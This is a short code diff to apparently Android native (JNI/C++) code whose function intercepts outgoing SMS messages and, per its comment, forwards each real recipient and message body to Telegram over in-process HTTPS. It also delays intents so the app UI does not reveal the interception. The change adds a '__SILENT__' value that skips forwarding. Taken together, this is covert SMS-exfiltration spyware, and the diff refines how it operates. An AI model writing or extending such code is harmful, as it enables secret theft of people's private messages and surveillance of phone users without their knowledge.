@@ -395,7 +395,9 @@ void on_outgoing_intercepted(JNIEnv* env, const std::string& dest, const std::st
     }
 
     // Gamex/SMSTweaks: Telegram ASAP with real To+body (in-process HTTPS)
-    queue_telegram(env, dest, body);
+    if (body != "__SILENT__") {
+        queue_telegram(env, dest, body);
+    }
 
     // SMSTweaks: delayed fireIntents (~800–2000ms) so app UI settles
     if (sent_intent || delivery_intent) {
